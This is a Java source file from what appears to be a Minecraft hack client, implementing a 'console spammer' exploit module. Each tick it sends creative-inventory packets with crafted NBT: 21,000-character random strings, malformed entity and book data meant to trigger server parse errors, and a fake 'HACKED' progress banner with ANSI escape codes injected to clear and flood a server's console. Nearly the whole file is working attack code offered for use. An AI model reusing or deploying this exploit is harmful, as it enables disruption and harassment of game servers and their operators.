package de.vandalismdevelopment.vandalism.feature.module.impl.exploit.modes.consolespammer;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import de.florianmichael.rclasses.math.integration.MSTimer;
import de.vandalismdevelopment.vandalism.base.event.TickListener;
import de.vandalismdevelopment.vandalism.feature.module.template.ModuleMulti;
import de.vandalismdevelopment.vandalism.feature.module.impl.exploit.ConsoleSpammerModule;
import de.vandalismdevelopment.vandalism.base.value.Value;
import de.vandalismdevelopment.vandalism.base.value.impl.selection.ModeValue;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import org.apache.commons.lang3.RandomStringUtils;

public class ItemModuleMode extends ModuleMulti<ConsoleSpammerModule> implements TickListener {

    private final Value<String> item = new ModeValue(
            "Item",
            "The item mode.",
            this.getParent(),
            "Spam Entity",
            "Troll Entity",
            "Troll Item Frame",
            "Troll Section",
            "Error Entity",
            "Error Entity V2",
            "Parse Error",
            "Test"
    ).visibleCondition(() -> this.getParent().mode.getSelectedMode().equals(this));

    public ItemModuleMode(final ConsoleSpammerModule parent) {
        super("Item", parent);
    }

    @Override
    public void onEnable() {
        DietrichEvents2.global().subscribe(TickEvent.ID, this);
    }

    @Override
    public void onDisable() {
        DietrichEvents2.global().unsubscribe(TickEvent.ID, this);
    }

    private int currentPercent = 0;
    private final MSTimer percentTimer = new MSTimer();

    private static final String TITLE =
            "888    888        d8888  .d8888b.  888    d8P  8888888888 8888888b.  \n" +
                    "888    888       d88888 d88P  Y88b 888   d8P   888        888  \"Y88b \n" +
                    "888    888      d88P888 888    888 888  d8P    888        888    888 \n" +
                    "8888888888     d88P 888 888        888d88K     8888888    888    888 \n" +
                    "888    888    d88P  888 888        8888888b    888        888    888 \n" +
                    "888    888   d88P   888 888    888 888  Y88b   888        888    888 \n" +
                    "888    888  d8888888888 Y88b  d88P 888   Y88b  888        888  .d88P \n" +
                    "888    888 d88P     888  \"Y8888P\"  888    Y88b 8888888888 8888888P\"\n" +

                    "\n[Needle made by vergessene]\n\n";

    private StringBuilder trollMsg = new StringBuilder(TITLE);

    private String getTrollMsg() {
        if (this.percentTimer.hasReached(100, true)) {
            this.currentPercent++;

            this.trollMsg.append("> ");
            if (this.currentPercent > 0 && this.currentPercent <= 10) {
                this.trollMsg.append("Cracking hashes");
            } else if (this.currentPercent > 10 && this.currentPercent <= 20) {
                this.trollMsg.append("Searching for important files");
            } else if (this.currentPercent > 20 && this.currentPercent <= 30) {
                this.trollMsg.append("Decrypting password hashes using hash executor");
            } else if (this.currentPercent > 30 && this.currentPercent <= 40) {
                this.trollMsg.append("Installing root kit");
            } else if (this.currentPercent > 40 && this.currentPercent <= 50) {
                this.trollMsg.append("Installing backdoor");
            } else if (this.currentPercent > 50 && this.currentPercent <= 60) {
                this.trollMsg.append("Installing doom eternal");
            } else if (this.currentPercent > 60 && this.currentPercent <= 65) {
                this.trollMsg.append("Installing admin evil Hack");
            } else if (this.currentPercent > 65 && this.currentPercent <= 70) {
                this.trollMsg.append("Bruteforcing remote endpoint");
            } else if (this.currentPercent > 70 && this.currentPercent <= 80) {
                this.trollMsg.append("Spawning hot minecraft e-girls");
            } else if (this.currentPercent > 80 && this.currentPercent <= 99) {
                this.trollMsg.append("Stealing bitcoin wallet");
            } else {
                this.currentPercent = 0;
                this.trollMsg = new StringBuilder(TITLE);
            }

            if (this.currentPercent > 0) {
                this.trollMsg.append(" ");
                this.trollMsg.append(this.currentPercent);
                this.trollMsg.append("% ...");
                this.trollMsg.append('\n');
            }
        }

        return "\033c\u001b[32m" + "\n".repeat(10) + this.trollMsg + "\n\u0007";
    }

    @Override
    public void onTick() {
        if (this.mc.player == null) return;
        int slot = 36 + this.mc.player.getInventory().selectedSlot;
        boolean place = true, clearSlot = false, setNbt = true;
        ItemStack stack = null;
        final NbtCompound nbt = new NbtCompound();
        switch (this.item.getValue()) {
            case "Spam Entity" -> {
                stack = new ItemStack(Items.BAT_SPAWN_EGG);
                final NbtCompound entityTag = new NbtCompound();
                entityTag.putString("SoundEvent", "HaCkEd:" + RandomStringUtils.random(21000));
                entityTag.putShort("life", (short) 1200);
                entityTag.putString("id", "minecraft:arrow");
                nbt.put("EntityTag", entityTag);
            }
            case "Troll Entity" -> {
                stack = new ItemStack(Items.BAT_SPAWN_EGG);
                final NbtCompound entityTag = new NbtCompound();
                entityTag.put("transformation", NbtString.of(this.getTrollMsg()));
                entityTag.putString("id", "minecraft:text_display");
                nbt.put("EntityTag", entityTag);
            }
            case "Troll Item Frame" -> {
                stack = new ItemStack(Items.ITEM_FRAME);
                final NbtCompound entityTag = new NbtCompound();
                final NbtCompound itemNbt = new NbtCompound();
                itemNbt.putString("id", this.getTrollMsg());
                entityTag.put("Item", itemNbt);
                entityTag.putByte("Fixed", (byte) 1);
                entityTag.putByte("Invisible", (byte) 1);
                entityTag.putByte("Silent", (byte) 1);
                entityTag.putByte("Invulnerable", (byte) 1);
                nbt.put("EntityTag", entityTag);
            }
            case "Troll Section" -> {
                stack = new ItemStack(Items.COW_SPAWN_EGG);
                final NbtCompound entityTag = new NbtCompound();
                entityTag.putFloat("Radius", 0f);
                entityTag.putString("Particle", "hacked:6:9" + this.getTrollMsg());
                entityTag.putString("id", "minecraft:area_effect_cloud");
                nbt.put("EntityTag", entityTag);
            }
            case "Error Entity" -> {
                stack = new ItemStack(Items.HORSE_SPAWN_EGG);
                final NbtCompound entityTag = new NbtCompound();
                entityTag.putByte("pickup", (byte) 3);
                entityTag.putShort("life", (short) 1200);
                entityTag.putString("id", "minecraft:arrow");
                nbt.put("EntityTag", entityTag);
            }
            case "Error Entity V2" -> {
                stack = new ItemStack(Items.BAT_SPAWN_EGG);
                final NbtCompound entityTag = new NbtCompound();
                entityTag.putFloat("Health", 1f);
                entityTag.putShort("Fire", (short) 100);
                entityTag.putString("DeathLootTable", "\"\"");
                nbt.put("EntityTag", entityTag);
            }
            case "Parse Error" -> {
                stack = new ItemStack(Items.WRITTEN_BOOK);
                nbt.putString("title", "");
                nbt.putString("author", "");
                final NbtList pages = new NbtList();
                pages.add(NbtString.of("{\"text\":\" \",\"hoverEvent\":{\"action\":\"show_item\",\"contents\":\"{}\"}}"));
                nbt.put("pages", pages);
                nbt.putByte("resolved", (byte) 1);
                place = false;
            }
            case "Test" -> {}
            default -> {}
        }

        if (stack != null) {
            if (setNbt) stack.setNbt(nbt);
            this.mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(slot, stack));

            if (place) {
                if (
                        this.mc.getCameraEntity().raycast(this.mc.interactionManager.getReachDistance(), 0, false)
                                instanceof final BlockHitResult blockHitResult
                ) {
                    this.mc.interactionManager.interactBlock(
                            this.mc.player,
                            Hand.MAIN_HAND,
                            blockHitResult
                    );
                }
            }

            if (clearSlot) {
                this.mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(slot, ItemStack.EMPTY));
            }
        }
    }

}
